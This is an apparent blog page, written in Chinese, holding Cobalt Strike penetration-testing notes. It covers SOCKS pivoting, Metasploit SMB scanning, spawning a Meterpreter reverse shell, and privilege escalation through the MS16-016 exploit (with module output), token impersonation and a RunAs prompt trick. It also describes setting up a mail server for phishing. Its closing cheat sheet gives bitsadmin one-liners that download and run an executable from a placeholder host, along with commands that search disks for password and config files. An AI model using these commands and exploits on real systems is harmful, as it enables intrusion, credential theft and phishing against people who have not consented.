@@ -1,0 +1,762 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CobaltStrike学习笔记续二">
+<meta property="og:url" content="http://yoursite.com/2018/04/27/CobaltStrike学习笔记续二/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description">
+<meta property="og:image" content="https://i.imgur.com/vASth5U.jpg">
+<meta property="og:image" content="https://i.imgur.com/9YVt9S7.jpg">
+<meta property="og:image" content="https://i.imgur.com/kH94AJ2.jpg">
+<meta property="og:image" content="https://i.imgur.com/wRVTFO0.jpg">
+<meta property="og:image" content="https://i.imgur.com/C7vUS4F.jpg">
+<meta property="og:image" content="https://i.imgur.com/cylJzqe.jpg">
+<meta property="og:image" content="https://i.imgur.com/4jLtPRq.jpg">
+<meta property="og:image" content="https://i.imgur.com/Ek5sSyt.jpg">
+<meta property="og:image" content="https://i.imgur.com/AOdUf2X.jpg">
+<meta property="og:image" content="https://i.imgur.com/H65qqam.jpg">
+<meta property="og:image" content="https://i.imgur.com/df2tkB1.jpg">
+<meta property="og:image" content="https://i.imgur.com/eNq2jr0.jpg">
+<meta property="og:image" content="https://i.imgur.com/EVwsabC.jpg">
+<meta property="og:image" content="https://i.imgur.com/LZzfuVH.jpg">
+<meta property="og:image" content="https://i.imgur.com/x3nuany.jpg">
+<meta property="og:image" content="https://i.imgur.com/gsdbibN.jpg">
+<meta property="og:image" content="https://i.imgur.com/1ThDIJm.jpg">
+<meta property="og:image" content="https://i.imgur.com/85W0XxE.jpg">
+<meta property="og:image" content="https://i.imgur.com/QYkSYdp.jpg">
+<meta property="og:image" content="https://i.imgur.com/Ot914lw.jpg">
+<meta property="og:image" content="https://i.imgur.com/EKmXyEy.jpg">
+<meta property="og:image" content="https://i.imgur.com/lSXDbpJ.jpg">
+<meta property="og:image" content="https://i.imgur.com/30LS2OZ.jpg">
+<meta property="og:image" content="https://i.imgur.com/PzC8Tv4.jpg">
+<meta property="og:image" content="https://i.imgur.com/Mz2p3jz.jpg">
+<meta property="og:image" content="https://i.imgur.com/x7jDdoX.jpg">
+<meta property="og:updated_time" content="2018-04-27T06:14:17.091Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CobaltStrike学习笔记续二">
+<meta name="twitter:description">
+<meta name="twitter:image" content="https://i.imgur.com/vASth5U.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> CobaltStrike学习笔记续二 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                CobaltStrike学习笔记续二
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2018-04-27T14:08:55+08:00" content="2018-04-27">
+              2018-04-27
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2018/04/27/CobaltStrike学习笔记续二/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/04/27/CobaltStrike学习笔记续二/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.imgur.com/vASth5U.jpg" alt=""></p>
+<a id="more"></a>
+<p>其实CobaltStrike真的很适合做内网渗透,主要还是能在边界找到入口点;</p>
+<h3 id="Socks代理功能"><a href="#Socks代理功能" class="headerlink" title="Socks代理功能"></a>Socks代理功能</h3><p>平常用tunna转发等工具,实在是不方便操作烦锁,而CobaltStrike自带了<code>SOCKS4a</code>代理;<br><code>socks5</code> 与 <code>socks4</code> 的主要区别是什么?</p>
+<blockquote>
+<p>参考 rfc1928</p>
+<ol>
+<li>增加了对 udp 数据报的支持(所以可以转发普通的基于udp的dns查询)</li>
+<li>增加对 ipv6 的支持</li>
+<li>增加了更丰富的认证方式</li>
+</ol>
+</blockquote>
+<p>开启代理:<br><code>[beacon] -&gt; Pivoting -&gt; SOCKS Server</code><br>端口都会随机分配,也可自定义;</p>
+<p><code>View -&gt; Proxy Pivots.</code><br>查看当前所开启的代理</p>
+<p><img src="https://i.imgur.com/9YVt9S7.jpg" alt=""></p>
+<p>除了图形化操作外,通过<code>socks</code>命令来开启;<br><img src="https://i.imgur.com/kH94AJ2.jpg" alt=""></p>
+<h4 id="Proxychains代理"><a href="#Proxychains代理" class="headerlink" title="Proxychains代理"></a>Proxychains代理</h4><p>Kali默认装有Proxychains,默认在<code>/etc/proxychains.conf</code>设置</p>
+<p><img src="https://i.imgur.com/wRVTFO0.jpg" alt=""></p>
+<p>通过<code>Proxychains firefox</code>执行代理;</p>
+<h4 id="metasploit代理"><a href="#metasploit代理" class="headerlink" title="metasploit代理"></a>metasploit代理</h4><p>在原来的代理下：<br><img src="https://i.imgur.com/C7vUS4F.jpg" alt=""></p>
+<p>自动生成命令复制到metasploit中<br><img src="https://i.imgur.com/cylJzqe.jpg" alt=""></p>
+<p>之后就可以加载各种模块进行扫描;<br><img src="https://i.imgur.com/4jLtPRq.jpg" alt=""></p>
+<p><img src="https://i.imgur.com/Ek5sSyt.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; setg Proxies socks4:xxx.xxx.xxx.xxx:48315</span><br><span class="line">Proxies =&gt; socks4:xxx.xxx.xxx.xxx:48315</span><br><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version                                  </span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.4.0/24           </span><br><span class="line">RHOSTS =&gt; 192.168.4.0/24</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; set THREADS 64</span><br><span class="line">THREADS =&gt; 64</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; exploit -j</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line">msf auxiliary(scanner/smb/smb_version) &gt; </span><br><span class="line">[*] Scanned  64 of 256 hosts (25% complete)</span><br><span class="line">[*] 192.168.4.104:139     - Host could not be identified:  ()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://www.cobaltstrike.com/help-socks-proxy-pivoting" target="_blank" rel="external">官方文档</a></li>
+</ul>
+<h3 id="CobaltStrike-插件"><a href="#CobaltStrike-插件" class="headerlink" title="CobaltStrike 插件"></a>CobaltStrike 插件</h3><ul>
+<li><a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="external">提权插件</a></li>
+</ul>
+<p><img src="https://i.imgur.com/AOdUf2X.jpg" alt=""></p>
+<p><img src="https://i.imgur.com/H65qqam.jpg" alt=""><br><img src="https://i.imgur.com/df2tkB1.jpg" alt=""></p>
+<ul>
+<li><a href="https://www.cobaltstrike.com/aggressor-script/index.html" target="_blank" rel="external">如何开发插件</a></li>
+</ul>
+<h3 id="Spawn"><a href="#Spawn" class="headerlink" title="Spawn"></a>Spawn</h3><p>CobaltStrike派生metasploit shell</p>
+<p><img src="https://i.imgur.com/eNq2jr0.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf use exploit/multi/handler                                                </span><br><span class="line">msf exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp     </span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST xx.xx.xx.xx</span><br><span class="line">LHOST =&gt; xx.xx.xx.xx</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 4478</span><br><span class="line">LPORT =&gt; 4478</span><br><span class="line">msf exploit(multi/handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/EVwsabC.jpg" alt=""><br><img src="https://i.imgur.com/LZzfuVH.jpg" alt=""><br><img src="https://i.imgur.com/x3nuany.jpg" alt=""></p>
+<p>这里出现了一个抗<br><code>Meterpreter session 1 closed.  Reason: Died</code></p>
+<p>是因为<code>cobaltstrike用的是http</code> 而msf用的<code>tcp</code><br>只需要协议一样就没问题了,怪自己不细心看；</p>
+<p><img src="https://i.imgur.com/gsdbibN.jpg" alt=""></p>
+<h3 id="MSF提权"><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h3><h4 id="getsystem提权"><a href="#getsystem提权" class="headerlink" title="getsystem提权"></a>getsystem提权</h4><p>使用了3种技术,默认是0尝试全部<br><img src="https://i.imgur.com/1ThDIJm.jpg" alt=""></p>
+<p>1.命令管道模拟提权 </p>
+<blockquote>
+<p>管道是指服务器应用程序在系统进程内进行通信的通道，创建该通道的应用程序就是管道服务器，与其连接的应用程序就是客户端，模拟是指服务器某个线程使用非自己身份去执行某项操作的能力，这种能力可以使服务器的某个线程代表客户端执行，这一现象称为命令管道扮演提升攻击</p>
+</blockquote>
+<p>其实1和2都类似</p>
+<p>3.令牌假冒</p>
+<blockquote>
+<p>低权限用户复制了高权限用户的令牌，低权限就拥有高权限用户所有权限.</p>
+</blockquote>
+<p>可能提权会先使用到,但不一定会成功;</p>
+<h4 id="本地提权-MS16-016提权"><a href="#本地提权-MS16-016提权" class="headerlink" title="本地提权- MS16-016提权"></a>本地提权- MS16-016提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf exploit(handler) &gt; use exploit/windows/<span class="built_in">local</span>/ms16_016_webdav </span><br><span class="line">msf exploit(ms16_016_webdav) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/<span class="built_in">local</span>/ms16_016_webdav):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 SP1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(ms16_016_webdav) &gt; <span class="built_in">set</span> SESSION 2</span><br><span class="line">SESSION =&gt; 2</span><br><span class="line">msf exploit(ms16_016_webdav) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.44.102:4444 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 2260 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 2260...</span><br><span class="line">[*] Exploit injected ... injecting payload into 2260...</span><br><span class="line">[*] Done.  Verify privileges manually or use <span class="string">'getuid'</span> <span class="keyword">if</span> using meterpreter to verify exploitation.</span><br><span class="line">msf exploit(ms16_016_webdav) &gt; sessions -i 2</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: EVILANNED7A5\ccav</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                   Arch  Session  User                 Path</span><br><span class="line"> ---   ----  ----                   ----  -------  ----                 ----</span><br><span class="line">                                          </span><br><span class="line"> 2168  2548  csrss.exe                                                  </span><br><span class="line"> 2260  336   notepad.exe            x86   3        NT AUTHORITY\SYSTEM  C:\Windows\system32\notepad.exe</span><br><span class="line"> 2452  520   msdtc.exe</span><br></pre></td></tr></table></figure>
+<p>成功利用漏洞利用了一个<code>system</code>权限的<code>notepad</code>程序<br><code>migrate</code>迁移<br><img src="https://i.imgur.com/85W0XxE.jpg" alt=""></p>
+<p>其它漏洞模块以此类推</p>
+<h4 id="假冒令牌"><a href="#假冒令牌" class="headerlink" title="假冒令牌"></a>假冒令牌</h4><p>令牌是系统临时密钥，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。我们输入<code>use incognito</code>命令，然后输入<code>list_tokens –u</code>，列出可用token<br><img src="https://i.imgur.com/QYkSYdp.jpg" alt=""><br>如果存在有管理员的可以通过<code>impersonate_token</code>来调用</p>
+<p><code>impersonate_token EVILANNED7A5\administrator</code></p>
+<h4 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h4><p>在<code>Windows Vista</code>以及更高的版本中，微软引进了安全控制策略，分为高、中、低三个等级。高等级的进程具有管理员权限，中等级进程拥有一个基本用户的权限，低级别的进程的权限是受各种限制的，用来保证当系统受到威胁时，带来的损害能保持到最小。</p>
+<p><img src="https://i.imgur.com/Ot914lw.jpg" alt=""></p>
+<h4 id="RunAs提权"><a href="#RunAs提权" class="headerlink" title="RunAs提权"></a>RunAs提权</h4><p><code>use exploit/windows/local/ask</code><br>目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。</p>
+<p>比较鸡助 但对于电脑小白还是很好用的不管什么都点 是</p>
+<h4 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h4><ul>
+<li><a href="https://xz.aliyun.com/t/258" target="_blank" rel="external">Metasploit权限提升全剧终</a></li>
+<li><a href="https://xz.aliyun.com/t/257" target="_blank" rel="external">Metasploit驰骋内网直取域管首级</a></li>
+<li><a href="https://xz.aliyun.com/t/203" target="_blank" rel="external">Metasploit、Powershell之AlwaysInstallElevated提权实战</a></li>
+<li><a href="https://manning23.github.io/2018/04/02/Windows%E6%8F%90%E6%9D%83%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86-Windows-Privilege-Escalation-Fundamentals/" target="_blank" rel="external">WINDOWS提权基本原理</a></li>
+<li><a href="https://www.anquanke.com/post/id/87292" target="_blank" rel="external">获取SYSTEM权限的多种姿势</a></li>
+</ul>
+<h3 id="邮件服务器"><a href="#邮件服务器" class="headerlink" title="邮件服务器"></a>邮件服务器</h3><p>有时候用到邮件钓鱼,会在taobao买一些163之类的邮件,不过现在过滤的挺严格了；<br>包括一些匿名邮箱限制的也比较多;</p>
+<p>所以搭起了<code>iRedMail</code></p>
+<p>参考链接:<br><a href="http://www.cnblogs.com/llius/p/5076235.html" target="_blank" rel="external">http://www.cnblogs.com/llius/p/5076235.html</a></p>
+<p>首先需要一个域名;</p>
+<p><img src="https://i.imgur.com/EKmXyEy.jpg" alt=""></p>
+<p>照文档安装成功后一些监控状态;<br><img src="https://i.imgur.com/lSXDbpJ.jpg" alt=""><br><img src="https://i.imgur.com/30LS2OZ.jpg" alt=""></p>
+<p>新建用户<br><img src="https://i.imgur.com/PzC8Tv4.jpg" alt=""></p>
+<p><img src="https://i.imgur.com/Mz2p3jz.jpg" alt=""></p>
+<p><img src="https://i.imgur.com/x7jDdoX.jpg" alt=""></p>
+<p>其实邮箱是发不出去的,一定要在域名中设置SPF与DKIM的记录;</p>
+<ul>
+<li><a href="https://www.cnblogs.com/miketwais/articles/DKIM.html" target="_blank" rel="external">关于iredmail邮箱系统配置SPF与DKIM的记录</a></li>
+</ul>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><h4 id="提权实用命令"><a href="#提权实用命令" class="headerlink" title="提权实用命令"></a>提权实用命令</h4><h5 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h5><p><code>bitsadmin /transfer myjob1 /download /priority normal http://aaa.com/a.exe c:\psexec.exe</code></p>
+<p><code>bitsadmin /rawreturn /transfer getfile http://aaa.com/a.zip c:\a.zip</code></p>
+<p><code>bitsadmin /rawreturn /transfer getpayload http://aaa.com/a.zip c:\a.zip</code></p>
+<p><code>bitsadmin /transfer mydownload /download /priority normal &quot;http://aaa.com/a.zip&quot; &quot;c:\a.zip&quot;</code></p>
+<p><code>cmd.exe /c bitsadmin /transfer 80d9 http://xxx.xxx.xxx.xxx:872/a %APPDATA%\80d9.exe&amp;%APPDATA%\80d9.exe&amp;del %APPDATA%\80d9.exe</code></p>
+<h4 id="查找敏感文件"><a href="#查找敏感文件" class="headerlink" title="查找敏感文件"></a>查找敏感文件</h4><p><code>dir /b /s password.txt</code><br><code>dir /b /s *.doc</code><br><code>dir /b /s *.ppt</code><br><code>dir /b /s *.xls</code><br><code>dir /b /s *.docx</code><br><code>dir /b /s *.xlsx</code><br><code>dir /b /s config.* filesystem</code><br><code>findstr /si password *.xml *.ini *.txt</code><br><code>findstr /silogin *.xml *.ini *.txt</code></p>
+<h4 id="目录文件操作"><a href="#目录文件操作" class="headerlink" title="目录文件操作"></a>目录文件操作</h4><p>显示当前目录<br><code>for /d %i in (d:\www\*) do @echo %i</code></p>
+<p>当前前面几个字母<br><code>for /d %i in (???) do @echo $i</code></p>
+<p>当前exe程序<br><code>for /r %i in (*.exe) do @echo $i</code></p>
+<p>列出所有子目录文件<br><code>for /r &quot;f:\www\&quot; %i in (*.*) do @echo %i</code></p>
+<p>读取内容<br><code>for /f %i in (c:\1.txt) do echo %i</code></p>
+<p>rar打包<br><code>rar a -k -r -s -m3 c:\1.rar d:\1.sql</code></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/18/Jarvis-OJ-平台Writeup/" rel="next" title="Jarvis OJ 平台Writeup">
+                <i class="fa fa-chevron-left"></i> Jarvis OJ 平台Writeup
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/30/2018-4月资源汇总/" rel="prev" title="2018-4月资源汇总">
+                2018-4月资源汇总 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2018/04/27/CobaltStrike学习笔记续二/"
+           data-title="CobaltStrike学习笔记续二" data-url="http://yoursite.com/2018/04/27/CobaltStrike学习笔记续二/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Socks代理功能"><span class="nav-number">1.</span> <span class="nav-text">Socks代理功能</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Proxychains代理"><span class="nav-number">1.1.</span> <span class="nav-text">Proxychains代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#metasploit代理"><span class="nav-number">1.2.</span> <span class="nav-text">metasploit代理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CobaltStrike-插件"><span class="nav-number">2.</span> <span class="nav-text">CobaltStrike 插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spawn"><span class="nav-number">3.</span> <span class="nav-text">Spawn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF提权"><span class="nav-number">4.</span> <span class="nav-text">MSF提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getsystem提权"><span class="nav-number">4.1.</span> <span class="nav-text">getsystem提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本地提权-MS16-016提权"><span class="nav-number">4.2.</span> <span class="nav-text">本地提权- MS16-016提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#假冒令牌"><span class="nav-number">4.3.</span> <span class="nav-text">假冒令牌</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UAC"><span class="nav-number">4.4.</span> <span class="nav-text">UAC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RunAs提权"><span class="nav-number">4.5.</span> <span class="nav-text">RunAs提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#资料"><span class="nav-number">4.6.</span> <span class="nav-text">资料</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#邮件服务器"><span class="nav-number">5.</span> <span class="nav-text">邮件服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Other"><span class="nav-number">6.</span> <span class="nav-text">Other</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#提权实用命令"><span class="nav-number">6.1.</span> <span class="nav-text">提权实用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#bitsadmin"><span class="nav-number">6.1.1.</span> <span class="nav-text">bitsadmin</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查找敏感文件"><span class="nav-number">6.2.</span> <span class="nav-text">查找敏感文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#目录文件操作"><span class="nav-number">6.3.</span> <span class="nav-text">目录文件操作</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
